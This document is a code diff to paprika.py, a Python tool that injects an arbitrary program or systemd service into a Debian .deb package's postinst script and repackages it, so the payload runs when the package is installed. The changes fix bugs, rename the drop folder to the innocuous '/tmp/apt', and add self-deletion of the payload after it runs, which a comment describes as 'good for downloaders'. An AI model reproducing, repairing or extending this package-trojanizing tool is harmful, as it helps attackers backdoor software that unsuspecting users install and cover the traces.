@@ -2,10 +2,12 @@
 # paprika.py
 # https://github.com/R-Rothrock/paprika
 
+from contextlib import suppress
 from datetime import datetime
-from os import chdir, getcwd, mkdir, system, walk
+from os import chdir, getcwd, makedirs, mkdir, system, walk
 from os.path import basename
 import sys
+from uuid import uuid4
 
 #%% Getting things ready
 
@@ -22,7 +24,8 @@ if len(sys.argv) < MIN_ARGC or len(sys.argv) > MAX_ARGC:
 
 class DebHandler:
     def __init__(self):
-        self.wdir = "/tmp/paprika_" + sys.argv[2]
+        random_str = uuid4().hex.upper()[0:10]
+        self.wdir = "/tmp/paprika_" + random_str
     
     def unzip(self) -> tuple:
         """
@@ -32,7 +35,7 @@ class DebHandler:
         mkdir(self.wdir)
 
         # copying
-        system("cp %s %s" % (sys.argv[2], wdir))
+        system("cp %s %s" % (sys.argv[2], self.wdir))
         deb_file = sys.argv[2].split("/")[-1]
             
         prev_dir = getcwd()
@@ -49,7 +52,7 @@ class DebHandler:
 
         files = []
         for (dirpath, dirnames, filenames) in walk(self.wdir):
-            f.extend(filenames)
+            files.extend(filenames)
             break
 
         ext = ""
@@ -60,7 +63,7 @@ class DebHandler:
 
         match ext:
             case "":
-                pass
+                pass # nothing to be done
             case ".gz":
                 system("gzip -d data.tar.gz")
             case ".bz2":
@@ -72,7 +75,10 @@ class DebHandler:
         mkdir("data")
         system("tar -xf control.tar --directory control")
         system("tar -xf data.tar --directory data")
-            
+        
+        # deleting old files
+        system("rm control.tar data.tar *.deb")
+
         chdir(prev_dir)
         
         yield self.wdir + "/control/preinst"
@@ -96,9 +102,9 @@ class DebHandler:
         system("gzip data.tar")
 
         # ar
-        system("ar -r new.deb debian_binary control.tar.gz data.tar.gz")
+        system("ar -r %s/new.deb debian-binary control.tar.gz data.tar.gz" % (self.wdir))
 
-        return getcwd() + "new.deb"
+        return self.wdir + "/new.deb"
 
 #%% Logging System
 
@@ -106,7 +112,7 @@ class Logger:
     def __init__(self, stream=sys.stdout, debug=True):
         self.stream = stream
 
-        self.debug = debug
+        self.debug_messages = debug
 
         self.blue   = "\033[34m"
         self.cyan   = "\033[36m"
@@ -123,7 +129,7 @@ class Logger:
         return "[%s%s%s]" % (self.blue, self.__get_time(), self.reset)
 
     def debug(self, msg):
-        if self.debug:
+        if not self.debug_messages:
             return
         print("%s[%sDEBUG%s]:\t%s" % (
             self.__get_time_field(), self.cyan, self.reset, msg
@@ -170,11 +176,13 @@ try:
         pass
 except FileNotFoundError:
     l.error("File `%s` doesn't exist. Exiting..." % (sys.argv[1]))
+    sys.exit(-1)
 try:
     with open(sys.argv[2], "r") as stream:
         pass
 except FileNotFoundError:
     l.error("File `%s` doesn't exist. Exiting..." % (sys.argv[2]))
+    sys.exit(-1)
 
 # recognizing file type of fist argument
 
@@ -204,7 +212,7 @@ elif sys.argv[1].endswith(".service"):
         with open(postinst_path, "a") as stream:
             stream.write(
                 "\nsystemctl enable /etc/systemd/user/%s\n" % (sys.argv[1])
-                "systemctl start /etc/systemd/user/%s" % (sys.argv[1])
+                + "systemctl start /etc/systemd/user/%s" % (sys.argv[1])
             )
 
 else:
@@ -213,11 +221,12 @@ else:
     # deletes the program after execution is complete
     # good for downloaders
     def ins_data(data_path, postinst_path):
-        mkdir("%s/tmp/1984ba647e97bf2cd70af" % (data_path))
-        system("cp %s %s/tmp/1984ba647e97bf2cd70af" % (sys.argv[1], data_path))
+        makedirs("%s/tmp/apt" % (data_path))
+        system("cp %s %s/tmp/apt" % (sys.argv[1], data_path))
         with open(postinst_path, "a") as stream:
             stream.write(
-                "\n/tmp/1984ba647e97bf2cd70af/*\n"
+                "\n/tmp/apt/*\n"
+                + "rm -rf /tmp/apt"
             )
 
 l.info("Starting execution")
@@ -232,6 +241,7 @@ ins_data(data, postinst)
 l.info("Rezipping file...")
 new_file = h.rezip()
 
+l.debug("Original new file is at %s" % (new_file))
 system("mv %s ." % (new_file))
 l.info("New file is located at './%s'." % (basename(new_file)))
 
